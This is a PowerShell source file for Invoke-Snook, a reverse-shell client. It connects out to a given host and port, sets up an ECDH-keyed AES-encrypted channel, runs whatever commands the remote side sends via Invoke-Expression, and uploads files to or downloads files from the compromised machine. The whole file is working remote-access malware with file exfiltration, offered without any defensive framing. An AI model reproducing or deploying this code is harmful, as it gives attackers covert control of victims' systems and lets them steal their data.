# TODO: Implement interactive mode


using namespace System.IO
using namespace System.Security.Cryptography


function Invoke-Snook
{
    [CmdletBinding()] Param(
        [Parameter(Mandatory=$true, Position=0)]
        [String]
        $Hostname,

        [Parameter(Mandatory=$true, Position=1)]
        [Int]
        $Port
    )


    function DictToBytes() {
        Param(
            [Parameter(Mandatory=$true, Position=1)]
            [HashTable]
            $Dict
        )

        $message = $Dict | ConvertTo-JSON
        return (New-Object System.Text.ASCIIEncoding).GetBytes($message)
    }


    function HKDFExpand {
        Param(
            [Parameter(Mandatory=$true, Position=0)]
            [Byte[]]
            $Prk
        )

        $hmac = New-Object HMACSHA256
        $hmac.Key = $Prk
        $okm = $hmac.ComputeHash([Byte]1)
        return $okm[0..15]
    }


    function ExportPEMPublicKey {
        Param(
            [Parameter(Mandatory=$true, Position=1)]
            [ECDiffieHellmanCngPublicKey]
            $key
        )

        $byteArray = $key.ToByteArray()
        # Header for secp384r1 curve
        $header = [Byte]0x30, 0x76, 0x30, 0x10, 0x06, 0x07, 0x2a, 0x86, 0x48, 0xce, 0x3d, 0x02,
                        0x01, 0x06, 0x05, 0x2b, 0x81, 0x04, 0x00, 0x22, 0x03, 0x62, 0x00, 0x04
        $data = $header + $byteArray[8..($byteArray.Length - 1)]
        $b64 = [Convert]::ToBase64String($data)
        return "-----BEGIN PUBLIC KEY-----`n$b64`n-----END PUBLIC KEY-----`n"
    }


    function FromBase64 {
        Param(
            [Parameter(Mandatory=$true, Position=0)]
            [String]
            $Str,

            [Parameter(Mandatory=$true, Position=1)]
            [System.Text.Encoding]
            $Encoding
        )
        return $Encoding.GetString([Convert]::FromBase64String($Str))
    }


    function GetPrompt {
        'PS ' + (Get-Location).Path + '>'
    }


    function ImportPEMPublicKey {
        Param(
            [Parameter(Mandatory=$true, Position=1)]
            [String]
            $PEMData
        )

        $PEMArray = $PEMData.Split([Environment]::NewLine)
        $b64 = [String]::Join('', $PEMArray[1..($PEMArray.Length - 3)])
        $data = [Convert]::FromBase64String($b64)
        $data = $data[24..($data.Length - 1)]
        $xBytes = $data[0..47]
        $yBytes = $data[48..96]

        $header = [Byte]0x45, 0x43, 0x4b, 0x33, 48, 0, 0, 0
        $blob = $header + $xBytes + $yBytes
        return [CngKey]::Import($blob, [CngKeyBlobFormat]::EccPublicBlob)
    }


    function ReceiveData {
        Param(
            [Parameter(Mandatory=$true, Position=0)]
            [System.Net.Sockets.NetworkStream]
            $Stream,

            [Parameter(Mandatory=$true, Position=1)]
            [Int]
            $Size
        )

        $buffer = New-Object System.Byte[] $Size
        $totalBytesRead = 0
        while ($totalBytesRead -lt $Size) {
            $bytesRead = $tcpStream.Read($buffer, $totalBytesRead, $Size - $totalBytesRead)
            if ($bytesRead -eq 0) {
                return $null
            }
            $totalBytesRead += $bytesRead
        }
        return $buffer
    }


    function ReceivePacket {
        Param(
            [Parameter(Mandatory=$true, Position=0)]
            [System.Net.Sockets.NetworkStream]
            $Stream,

            [Parameter(Mandatory=$true, Position=1)]
            [Byte[]]
            [AllowNull()]
            $aesKey
        )

        $size_bytes = (ReceiveData $Stream 4)
        if ($size_bytes -eq $null) {
            return $null
        }

        [Array]::Reverse($size_bytes)
        $size = [BitConverter]::ToInt32($size_bytes, 0)

        if ($aesKey -ne $null) {
            $iv = (ReceiveData $Stream 16)
        }

        $bytes = (ReceiveData $Stream $size)
        if ($aesKey -ne $null) {
            $aes = [Aes]::Create()
            $aes.Key = $aesKey
            $aes.IV = $iv
            $aes.Padding = [PaddingMode]::PKCS7
            $decryptor = $aes.CreateDecryptor($aes.Key, $aes.IV)
            $msDecrypt = New-Object MemoryStream @(,$bytes)
            $csDecrypt = New-Object CryptoStream($msDecrypt, $decryptor, [CryptoStreamMode]::Read)
            $decrypted = New-Object System.Byte[] $bytes.Length
            $bytesCount = $csDecrypt.Read($decrypted, 0, $bytes.Length)
            $bytes = $decrypted[0..($bytesCount - 1)]
        }

        return $bytes
    }


    function SendPacket {
        Param(
            [Parameter(Mandatory=$true, Position=0)]
            [System.Net.Sockets.NetworkStream]
            $Stream,

            [Parameter(Mandatory=$true, Position=1)]
            [Byte[]]
            $Data,

            [Parameter(Mandatory=$true, Position=2)]
            [Byte[]]
            [AllowNull()]
            $aesKey
        )

        if ($aesKey -ne $null) {
            $iv = New-Object Byte[] 16
            $rng = New-Object RNGCryptoServiceProvider
            $rng.GetBytes($iv)

            $aes = [Aes]::Create()
            $aes.Key = $aesKey
            $aes.IV = $iv
            $aes.Padding = [PaddingMode]::PKCS7
            $encryptor = $aes.CreateEncryptor($aes.Key, $aes.IV)
            $msEncrypt = New-Object MemoryStream
            $csEncrypt = New-Object CryptoStream($msEncrypt, $encryptor, [CryptoStreamMode]::Write)
            $csEncrypt.Write($Data, 0, $Data.Length)
            $csEncrypt.FlushFinalBlock()
            $Data = $msEncrypt.ToArray()
        }

        $size = [BitConverter]::GetBytes($Data.Length)
        [Array]::Reverse($size)
        $Stream.Write($size, 0, $size.Length)
        if ($aesKey -ne $null) {
            $Stream.Write($iv, 0, $iv.Length)
        }
        $Stream.Write($Data, 0, $Data.Length)
        $Stream.Flush()
    }


    function ToBase64 {
        Param(
            [Parameter(Mandatory=$true, Position=0)]
            [PSObject]
            $InputObj,

            [Parameter(Mandatory=$true, Position=1)]
            [System.Text.Encoding]
            $Encoding
        )
        $str = ($InputObj | Out-String)
        $str = $str.SubString(0, $str.Length - 2)  # Remove last line break
        return [Convert]::ToBase64String($Encoding.GetBytes($str)) 
    }


    $tcpConnection = New-Object System.Net.Sockets.TcpClient($Hostname, $Port)

    $tcpStream = $tcpConnection.GetStream()
    $encoding = New-Object System.Text.UTF8Encoding

    $prompt = ToBase64 (GetPrompt) $encoding
    $message = @{}
    $message.Add('action', 'hello')
    $arg = @{}
    $arg.Add('features', @('download', 'upload'))
    $arg.Add('os', 'Windows')
    $encryption = @{}
    $encryption.Add('supported', $true)
    $encryption.Add('enabled', $true)

    $key = [CngKey]::Create([CngAlgorithm]::ECDiffieHellmanP384)
    $ecdh = New-Object ECDiffieHellmanCng($key)
    $ecdh.KeyDerivationFunction = [ECDiffieHellmanKeyDerivationFunction]::Hmac
    $ecdh.HashAlgorithm = [CngAlgorithm]::Sha256
    $ecdh.HmacKey = [Byte]0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
    $pem = ExportPEMPublicKey $ecdh.PublicKey
    $pem = ToBase64 $pem (New-Object System.Text.ASCIIEncoding)
    $encryption.Add('pbkey', $pem)

    $arg.Add('encryption', $encryption)
    $message.Add('args', $arg)
    $message.Add('prompt', $prompt)
    SendPacket $tcpStream (DictToBytes $message) $aesKey

    $buffer = New-Object System.Byte[] 4096
    $aesKey = $null

    while ($tcpConnection.Connected) {
        $packet = (ReceivePacket $tcpStream $aesKey)
        if ($packet -eq $null) {
            break
        }
        $packet = (New-Object System.Text.ASCIIEncoding).GetString($packet)
        $packet = $packet | ConvertFrom-JSON
        
        if ($packet.action -eq 'hello') {
            $pem = FromBase64 $packet.args.encryption.pbkey (New-Object System.Text.ASCIIEncoding)
            $peerKey = ImportPEMPublicKey $pem
            $sharedKey = $ecdh.DeriveKeyMaterial($peerKey)
            $aesKey = HKDFExpand $sharedKey
        } elseif ($packet.action -eq 'cmd') {        
            $command = FromBase64 $packet.args.cmd $encoding
            $out = Invoke-Expression -Command $command -WarningVariable warn `
                                     -ErrorVariable err 2>$null 3>$null

            $response = @{}
            $response.Add('action', $packet.action)
            if ($out) { $response.Add('message', (ToBase64 $out $encoding)) }
            if ($warn) { $response.Add('warning', (ToBase64 $warn[0] $encoding)) }
            if ($err) { $response.Add('error', (ToBase64 $err[0] $encoding)) }
            $response.Add('prompt', (ToBase64 (GetPrompt) $encoding))

            SendPacket $tcpStream (DictToBytes $response) $aesKey
        } elseif ($packet.action -eq 'download') {
            $response = @{}
            $response.Add('action', $packet.action)
            $path = FromBase64 $packet.args.path $encoding

            if (![System.IO.Path]::IsPathRooted($path)) {
                $path = Join-Path -Path (Get-Location).Path -ChildPath $path
            }

            try {
                $reader =  [System.IO.File]::OpenRead($path)
            } catch {
                $err = ToBase64 $error[0] $encoding
                $response.Add('error', $err)
            }

            if (!$response.ContainsKey('error')) {
                $arguments = @{}
                $arguments.Add('size', $reader.Length)
                $response.Add('args', $arguments)
            }
            
            SendPacket $tcpStream (DictToBytes $response) $aesKey

            if ($response.ContainsKey('error')) {
                continue
            }

            while (($readBytes = $reader.Read($buffer, 0, $buffer.Length)) -ne 0) {
                SendPacket $tcpStream $buffer[0..($readBytes - 1)] $aesKey
            }

            $reader.Dispose()
            $reader.Close()
        } elseif ($packet.action -eq 'upload') {
            $response = @{}
            $response.Add('action', $packet.action)
            $dest = FromBase64 $packet.args.dest $encoding

            try {
                if (![System.IO.Path]::IsPathRooted($dest)) {
                    $dest = Join-Path -Path (Get-Location).Path -ChildPath $dest
                }                

                if ((Get-Item $dest -ErrorAction SilentlyContinue) -is [System.IO.DirectoryInfo]) {
                    $filePath = Join-Path -Path $dest -ChildPath $packet.args.filename
                } else {
                    $filePath = $dest
                }
                
                $writer = [System.IO.File]::OpenWrite($filePath)
            } catch {
                $err = ToBase64 $error[0] $encoding
                $response.Add('error', $err)
            }

            SendPacket $tcpStream (DictToBytes $response) $aesKey

            if ($response.ContainsKey('error')) {
                continue
            }

            $bytesCount = 0
            $err = $false
            while ($bytesCount -ne $packet.args.size) { 
                $data = (ReceivePacket $tcpStream $aesKey)
                if ($data -eq $null) {
                    $err = $true
                    break
                }
                $writer.Write($data, 0, $data.Length)
                $bytesCount += $data.Length
            }

            $writer.Dispose()
            $writer.Close()

            if ($err) {
                break
            }

            $response = @{}
            $response.Add('action', $packet.action)
            $response.Add('message', (ToBase64 (Resolve-Path -Path $filePath).Path $encoding))
            SendPacket $tcpStream (DictToBytes $response) $aesKey
        }
    }
    $tcpConnection.Close()
}